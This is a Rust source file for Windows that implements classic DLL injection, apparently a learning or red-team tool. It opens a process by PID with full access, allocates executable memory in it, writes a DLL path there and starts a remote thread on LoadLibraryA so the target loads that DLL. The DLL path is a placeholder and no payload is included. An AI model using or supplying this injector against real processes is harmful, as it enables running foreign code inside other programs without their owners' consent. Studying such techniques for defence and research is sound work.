use std::{ffi::c_void, thread::sleep, time::Duration};

use clap::Parser;
use windows::{core::s, Win32::{Foundation::CloseHandle, System::{Diagnostics::Debug::WriteProcessMemory, LibraryLoader::{GetModuleHandleA, GetProcAddress}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS}}}};

#[derive(Parser)]
struct Cli {
    #[arg(long)]
    pid: u32,
}

fn main() -> ! {
    sleep(Duration::from_secs(1));
    let args = Cli::parse();
    println!("Attempting to open process: {}", args.pid);
    let res = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, false, args.pid)
    };

    println!("Open process result: {:?}", res);

    let handle = if res.is_ok() {
        res.unwrap()
    } else {
        panic!("Did not get handle");
    };

    // ALLOCATE MEMORY FOR OUR ADDRESS
    let path_to_dll = "path\\to\\dll\\rust_dll.dll\0";
    
    let allocated_vaddr = unsafe {
        VirtualAllocEx(handle, 
            None, 
            size_of_val(path_to_dll),
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        )
    };
    
    if allocated_vaddr.is_null() {
        panic!("[-] Did not allocate memory in target process");
    } else {
        println!("[+] Allocated at address: {:p}", allocated_vaddr);
    }

    // Write to the buffer
    let mut bytes_written: usize = 0;
    let buff_result = unsafe {
        WriteProcessMemory(handle, allocated_vaddr, path_to_dll.as_ptr() as *const c_void, size_of_val(path_to_dll), Some(&mut bytes_written as *mut usize))
    };

    match buff_result {
        Ok(_) => println!("[+] Bytes written to remote process: {:?}", bytes_written),
        Err(e) => panic!("[-] Error writing remote process memory: {e}"),
    }
    
    let h_kernel32 = unsafe { GetModuleHandleA(s!("Kernel32.dll")) };
    let h_kernel32 = match h_kernel32 {
        Ok(h) => {
            println!("[+] Handle to Kernel32.dll: {:?}", h);
            h
        }
        Err(e) => panic!("[-] Could not get handle to Kernel32.dll, {e}"),
    };
    // GET FUNCTION POINTER TO LOAD LIBRARY
    let load_library_fn_address = unsafe { GetProcAddress(h_kernel32, s!("LoadLibraryA")) };
    let load_library_fn_address = match load_library_fn_address {
        None => panic!("[-] Could not resolve the address of LoadLibraryA."),
        Some(address) => {
            let address = address as *const (); // better cast as per https://doc.rust-lang.org/std/mem/fn.transmute.html
            println!("[+] Address of LoadLibraryA: {:p}", address);
            address
        }
    };
    // correctly cast the address of LoadLibraryA
    let load_library_fn_address: Option<unsafe extern "system" fn(*mut c_void) -> u32> = Some(
        unsafe { std::mem::transmute(load_library_fn_address) }
    );

    let mut thread: u32 = 0;

    // create thread
    let h_thread = unsafe { CreateRemoteThread(
        handle,
        None, // default security descriptor
        0, // default stack size
        load_library_fn_address,
        Some(allocated_vaddr),
        0,
        Some(&mut thread as *mut u32),
    )};

    match h_thread {
        Ok(h) => println!("[+] Thread started, handle: {:?}", h),
        Err(e) => panic!("[-] Error occurred creating thread: {e}"),
    }

    let _ = unsafe { CloseHandle(handle)};
    
    loop {}
}
